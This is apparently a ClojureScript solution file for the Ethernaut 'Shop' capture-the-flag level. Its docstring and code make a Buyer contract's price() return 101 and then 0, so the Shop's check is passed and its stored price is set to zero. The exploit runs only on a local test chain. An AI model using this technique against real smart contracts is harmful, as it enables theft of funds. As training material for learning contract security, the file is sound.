(ns ctf.ethernaut.shop
  "This problem is similar to Building and Elevator contracts.

  We first deploy the Buyer contract. It will have a `buy`
  function that triggers the attack.

  Our Buyer contract will also provide the implementation of
  the `price` function. In our price implementation, we will
  read the state of the Shop (isSold public var). If isSold is
  false, we return 101. Since the return value is greater than 100
  it will pass the following if check.

  ```
    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  ```

  Next time the Shop contract call our `price function`, `isSold`
  will become true. In this case we will return price as 0.
  "
  (:require [ctf.ethernaut.utils :as u]
            [ctf.ethernaut.wallets :as w]
            [cljs.core.async :as a]
            [cljs.core.async.interop :refer-macros [<p!]])
  (:require-macros [ctf.core :refer [try-async]]))


;; Init the a new wallet for the player
;; Attach it with the local provider
(def player
  (w/get-player! w/local-provider))


(defn deploy-shop!
  "Deploys the Shop contract using the local wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :shop w/local-wallet)]
    (.deploy contract)))


(defn deploy-buyer!
  "Deploys the Buyer contract using players' wallet!
   Returns the `js/Promise`."
  []
  (let [contract (u/contract :buyer player)]
    (.deploy contract)))


(defn buy-cheap
  []
  (try-async
   [shop (<p! (deploy-shop!))
    buyer (<p! (deploy-buyer!))]
   (do
     (<p! (.buy buyer (.-address shop)))
     (let [price    (<p! (.price shop))
           is-sold? (<p! (.isSold shop))]
       [is-sold?, price]))))




(comment

  ;; Execute this code to "buy cheap"
  (a/take! (buy-cheap) #(prn %))


  (-> (u/compile-all!)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (def shop (atom ""))
  (-> (deploy-shop!)
      (.then #(reset! shop %))
      (.catch #(.log js/console %)))


  (def buyer (atom ""))
  (-> (deploy-buyer!)
      (.then #(reset! buyer %))
      (.catch #(.log js/console %)))


  (-> (.buy @buyer
            (.-address @shop))
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.price @shop)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))


  (-> (.isSold @shop)
      (.then #(.log js/console %))
      (.catch #(.log js/console %)))

  )
